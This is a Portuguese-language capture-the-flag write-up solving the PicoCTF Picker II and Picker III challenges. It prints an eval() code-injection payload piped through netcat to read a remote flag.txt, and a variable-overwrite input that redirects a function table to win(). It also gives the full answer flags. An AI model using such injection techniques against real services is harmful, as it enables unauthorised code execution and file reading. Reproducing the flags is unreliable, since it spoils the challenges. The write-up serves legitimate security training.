---
title: "Interlude"
weight: 7
# bookFlatSection: false
# bookToc: true
# bookHidden: false
# bookCollapseSection: false
# bookComments: false
# bookSearchExclude: false
# bookHref: ''
---
# PicoCTF: Low Level Binary Intro - Interlude

Vamos dar uma pausa no código de baixo nível e analisar novamente alguns programas em Python. Tentaremos traçar alguns paralelos entre a exploração de programas binários e a exploração de programas em Python.

## Picker II 

> Você consegue descobrir como esse programa funciona para obter a flag?

Desta vez, estamos analisando código Python, não em uma linguagem de baixo nível, mas sim analisando código de alto nível.

O problema nos oferece um arquivo de script Python e uma conexão via netcat (para executar o código remotamente, onde a flag está localizada). O script possui as seguintes funções:

```python
def getRandomNumber():
def exit():
def esoteric1():
def win():
def esoteric2():
def filter(user_input):
```

Ao executar este script, ele apresenta uma entrada para ser inserida (input). Se digitarmos o texto "getRandomNumber", o programa retorna "4". Isso significa que podemos chamar qualquer função no código com essa entrada. A função que queremos executar se chama "win()".

```python
def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)
```

Essa função abre um arquivo chamado "flag.txt", lê seu conteúdo e o imprime na tela. É Isso que precisamos, mas há um problema. Antes de chegarmos à função "win", a entrada passa por um filtro que retorna falso se tentarmos inserir o texto "win". Portanto, precisamos encontrar uma alternativa.

```python
def filter(user_input):
  if 'win' in user_input:
    return False
  return True
```

Ao analisar o filtro, podemos ver que ele utiliza uma função vulnerável chamada "eval":

```python
if( filter(user_input) ):
	eval(user_input + '()')
```

Podemos usar isso a nosso favor, talvez não possamos usar a chamada para "win", mas podemos chamar tudo o que for útil dentro da função "win". Vamos inserir um código direto no terminal para ler o arquivo "flag.txt" no programa:

```python
echo "print(open('flag.txt', 'r').read())" | nc saturn.picoctf.net 69420
```

E com sucesso, com isso a falg é revelada.


{{% details title="Answer: Flag Picker II" open=false %}}
```
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}
```
{{% /details %}}

---

## Picker III 

> Você consegue descobrir como esse programa funciona para obter a flag?

Este exercício é muito semelhante ao anterior. Vamos analisar um script Python e encontrar vulnerabilidades nele. Após encontrar uma vulnerabilidade, podemos aplicá-la ao endereço do netcat e recuperar a flag.

O programa agora pede para selecionar um método dentre um intervalo de números, de 1 a 4, limitando nossa entrada. A tabela está escrita em uma variável chamada `func_table`:

```python
  global func_table

  # Esta tabela está formatada para facilitar a visualização, mas na verdade é uma única linha.
  func_table = \
'''\
print_table                     \
read_variable                   \
write_variable                  \
getRandomNumber                 \
'''
```

Esta é a lista de funções que podem ser chamadas. Essa variável está constantement sendo verificada vendo se seu tamanho foi modificado. Se o tamanho da tabela for alterado, o programa exibirá uma mensagem informando que ela está corrompida.

```python
FUNC_TABLE_SIZE = 4
FUNC_TABLE_ENTRY_SIZE = 32
CORRUPT_MESSAGE = 'Table corrupted. Try entering \'reset\' to fix it'

def check_table():
  global func_table

  if( len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZE):
    return False

  return True
```

Se a tabela não tiver 32 caracteres por 4 linhas (32x4 caracteres), ela será definida como "Corrompida". Se verificarmos a tabela atual, podemos ver que esses números correspondem, preenchidos com espaços:

```python
		32 caracteres
|-------------------------------|
print_table                     \
read_variable                   \
write_variable                  \
getRandomNumber                 \
```

Também podemos ler e escrever em uma variável (como `func_table` e `FUNC_TABLE_SIZE`). O `getRandomNumber` funciona da mesma forma de sempre.

Após ler e analisar o código, podemos experimentar com a variável `func_table` e a função `write_variable`. A ideia é alterar o nome da função "print_table" para "win" sem alterar o tamanho da tabela. Inserindo algo como:

```python
		32 caracteres
|-------------------------------|
win                             \  <-- change
read_variable                   \
write_variable                  \
getRandomNumber                 \
```

Em seguida, chame a primeira função da tabela, que nos mostraria a flag.

Dessa vez, automatizarei a entrada (input) usando um arquivo file.txt com as informações que desejo enviar de uma só vez. O arquivo file.txt terá esse conteúdo:

```
3
func_table
'''win                             read_variable                   write_variable                  getRandomNumber                 '''
1
```

O texto vai:
- 3: Selecionar para alterar uma variável (write_variable)
- func_table: nome da variável
- '''win ... : novo valor na tabela
- 1: Selecione para chamar a primeira função (antes era print_table, agora é win)

E o comando do shell é:

```bash
cat file.txt | nc saturn.picoctf.net 69420
```

Após a entrada automatizada ser processada pela conexão netcat, recebemos a seguinte saída da função "win()":

```
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x63 0x32 0x30 0x66 0x35 0x32 0x32 0x32 0x7d
```

Após decodificar esta mensagem e convertê-la de hexadecimal para string, obtemos nossa flag:

{{% details title="Answer: Flag Picker III" open=false %}}
```
picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_c20f5222}
```
{{% /details %}}


